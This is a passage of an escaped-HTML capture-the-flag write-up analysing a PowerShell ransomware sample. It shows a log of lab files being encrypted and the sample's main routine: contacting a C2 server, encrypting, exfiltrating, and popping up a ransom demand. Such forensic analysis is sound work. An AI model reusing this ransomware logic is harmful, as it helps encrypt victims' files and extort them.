[\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_56.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_57.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_58.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_59.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_6.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_7.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_8.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\flag_9.txt is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\IoT_security_IoTSec_considerations_requirements_and_architectures.pdf is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\jM\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">z3b7f_400x400.jpg is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\mim.png is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\pexels\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">sebastiaan\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">stam\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">1097456.\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">jpg is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\vietnam.jpg is now encrypted [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> C:\\Users\\IEUser\\Documents\\z3399223868975_f9672eaf281fbf6771659ccb18692a12.jpg is now encrypted\u003C/span>\u003C/span>\u003Cbutton type=\"button\" title=\"Copy code\" aria-label=\"Copy code\" data=\" python .\\B64ReverseLogs.py\n[!]\n C:\\Users\\IEUser\\Documents\\13bae5d78b3351adcd58116cc58465ed.png is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\248368233_230702282385338_6224698627922749235_n.jpg is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\ad1639ada044a912032925bdc7f132c8.jpg is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\black.png is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_1.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_10.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_11.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_12.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_13.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_14.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_15.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_16.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_17.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_18.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_19.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_2.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_20.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_21.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_22.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_23.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_24.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_25.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_26.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_27.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_28.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_29.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_3.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_30.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_31.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_32.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_33.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_34.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_35.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_36.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_37.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_38.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_39.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_4.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_40.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_41.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_42.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_43.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_44.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_45.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_46.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_47.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_48.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_49.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_5.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_50.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_51.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_52.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_53.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_54.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_55.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_56.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_57.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_58.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_59.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_6.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_7.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_8.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\flag_9.txt is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\IoT_security_IoTSec_considerations_requirements_and_architectures.pdf is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\jM-z3b7f_400x400.jpg is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\mim.png is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\pexels-sebastiaan-stam-1097456.jpg is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\vietnam.jpg is now encrypted [!]\n C:\\Users\\IEUser\\Documents\\z3399223868975_f9672eaf281fbf6771659ccb18692a12.jpg is now encrypted\" class=\"rehype-pretty-copy\" onclick=\"navigator.clipboard.writeText(this.attributes.data.value);this.classList.add(&#x27;rehype-pretty-copied&#x27;);window.setTimeout(() => this.classList.remove(&#x27;rehype-pretty-copied&#x27;), 1000);\">\u003Cspan class=\"ready\">\u003C/span>\u003Cspan class=\"success\">\u003C/span>\u003C/button>\u003Cstyle>:root {--copy-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23adadad' d='M16.187 9.5H12.25a1.75 1.75 0 0 0-1.75 1.75v28.5c0 .967.784 1.75 1.75 1.75h23.5a1.75 1.75 0 0 0 1.75-1.75v-28.5a1.75 1.75 0 0 0-1.75-1.75h-3.937a4.25 4.25 0 0 1-4.063 3h-7.5a4.25 4.25 0 0 1-4.063-3M31.813 7h3.937A4.25 4.25 0 0 1 40 11.25v28.5A4.25 4.25 0 0 1 35.75 44h-23.5A4.25 4.25 0 0 1 8 39.75v-28.5A4.25 4.25 0 0 1 12.25 7h3.937a4.25 4.25 0 0 1 4.063-3h7.5a4.25 4.25 0 0 1 4.063 3M18.5 8.25c0 .966.784 1.75 1.75 1.75h7.5a1.75 1.75 0 1 0 0-3.5h-7.5a1.75 1.75 0 0 0-1.75 1.75'/%3E%3C/svg%3E\");--success-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%2366ff85' d='M9 16.17L5.53 12.7a.996.996 0 1 0-1.41 1.41l4.18 4.18c.39.39 1.02.39 1.41 0L20.29 7.71a.996.996 0 1 0-1.41-1.41z'/%3E%3C/svg%3E\");}pre:has(code) {position: relative;}pre button.rehype-pretty-copy {right: 1px;padding: 0;width: 24px;height: 24px;display: flex;margin-top: 2px;margin-right: 8px;position: absolute;border-radius: 25%;backdrop-filter: blur(3px);& span {width: 100%;aspect-ratio: 1 / 1;}& .ready {background-image: var(--copy-icon);}& .success {display: none; background-image: var(--success-icon);}}&.rehype-pretty-copied {& .success {display: block;} & .ready {display: none;}}pre button.rehype-pretty-copy.rehype-pretty-copied {opacity: 1;& .ready { display: none; }& .success { display: block; }}pre button.rehype-pretty-copy { opacity: 0; }figure[data-rehype-pretty-code-figure]:hover > pre > code button.rehype-pretty-copy {opacity: 1;}\u003C/style>\u003C/code>\u003C/pre>\u003C/figure>\n\u003Cp>Bingo, many \u003Ccode>.txt\u003C/code> file was encrypted.\u003C/p>\n\u003C/section>\u003C/section>\u003Csection class=\"heading\" data-heading-rank=\"3\" aria-labelledby=\"finding-the-flag\">\u003Ch3 id=\"finding-the-flag\">Finding the flag\u003C/h3>\n\u003Cp>Now we need to find how and where the file was sent.\u003C/p>\n\u003Cp>Looking back at main function, we could see after running \u003Ccode>EncryptFiles\u003C/code> it run \u003Ccode>ExfiltrateFiles\u003C/code>\u003C/p>\n\u003Cfigure data-rehype-pretty-code-figure=\"\">\u003Cpre style=\"--shiki-light:#0e1116;--shiki-dark:#f0f3f6;--shiki-light-bg:#ffffff;--shiki-dark-bg:#0a0c10\" tabindex=\"0\" data-language=\"powershell\" data-theme=\"github-light-high-contrast github-dark-high-contrast\">\u003Ccode data-language=\"powershell\" data-theme=\"github-light-high-contrast github-dark-high-contrast\" style=\"display: grid;\">\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ($Mode \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-eq\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"-d\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">) { \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> Write-Host\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ; \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">Write-Host\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"[!] Shutdowning....\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">ForegroundColor Red; sleep \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">1\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> }\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">else\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> {\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> Write-Host\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ;\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> Write-Host\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"[+] Checking communication with C2 Server..\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">ForegroundColor Blue\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $DCe \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> GetStatus ; sleep \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">1\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $WiETm \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -join\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ( (\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">48\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">..\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">57\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">) \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">+\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> (\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">65\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">..\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">90\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">) \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">+\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> (\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">97\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">..\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">122\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">) \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">|\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> Get-Random\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">Count \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">24\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> |\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> %\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> {[\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">char\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$_\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">})\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> Write-Host\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"[!] Encrypting ...\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">ForegroundColor Red\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> CreateReadme ; EncryptFiles ; \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ($DCe) { SendResults ; sleep \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">1\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ($ENyR \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-eq\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"-x\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">) { \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">Write-Host\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"[i] Exfiltrating ...\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">ForegroundColor Green\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">ExfiltrateFiles ; sleep \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">1\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> }}\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> (\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$DCe) { \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">Write-Host\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"[+] Saving logs in yaginote.txt..\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">ForegroundColor Blue }\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> else\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> { \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">Write-Host\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"[+] Sending logs to C2 Server..\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">ForegroundColor Blue }}\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> (\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$args\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -like\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"-demo\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">) { RemoveWallpaper ; PopUpRansom\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ($PayNow \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-eq\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"True\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">) { SendPay ; SendOK } \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">else\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> { SendClose ; SendOK }}\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> else\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> { SendOK }\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">sleep \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">1000\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ; \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">Write-Host\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"[i] Done!\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">ForegroundColor Green ; \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">Write-Host\u003C/span>\u003C/span>\u003Cbutton type=\"button\" title=\"Copy code\" aria-label=\"Copy code\" data=\"if ($Mode -eq &#x22;-d&#x22;) { \n Write-Host ; Write-Host &#x22;[!] Shutdowning....&#x22; -ForegroundColor Red; sleep 1 }\nelse {\n Write-Host ;\n Write-Host &#x22;[+] Checking communication with C2 Server..&#x22; -ForegroundColor Blue\n $DCe = GetStatus ; sleep 1\n $WiETm = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | % {[char]$_})\n Write-Host &#x22;[!] Encrypting ...&#x22; -ForegroundColor Red\n CreateReadme ; EncryptFiles ; if ($DCe) { SendResults ; sleep 1\n if ($ENyR -eq &#x22;-x&#x22;) { Write-Host &#x22;[i] Exfiltrating ...&#x22; -ForegroundColor Green\nExfiltrateFiles ; sleep 1 }}\n if (!$DCe) { Write-Host &#x22;[+] Saving logs in yaginote.txt..&#x22; -ForegroundColor Blue }\n else { Write-Host &#x22;[+] Sending logs to C2 Server..&#x22; -ForegroundColor Blue }}\n if ($args -like &#x22;-demo&#x22;) { RemoveWallpaper ; PopUpRansom\n if ($PayNow -eq &#x22;True&#x22;) { SendPay ; SendOK } else { SendClose ; SendOK }}\n else { SendOK }\nsleep 1000 ; Write-Host &#x22;[i] Done!&#x22; -ForegroundColor Green ; Write-Host\" class=\"rehype-pretty-copy\" onclick=\"navigator.clipboard.writeText(this.attributes.data.value);this.classList.add(&#x27;rehype-pretty-copied&#x27;);window.setTimeout(() => this.classList.remove(&#x27;rehype-pretty-copied&#x27;), 1000);\">\u003Cspan class=\"ready\">\u003C/span>\u003Cspan class=\"success\">\u003C/span>\u003C/button>\u003Cstyle>:root {--copy-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23adadad' d='M16.187 9.5H12.25a1.75 1.75 0 0 0-1.75 1.75v28.5c0 .967.784 1.75 1.75 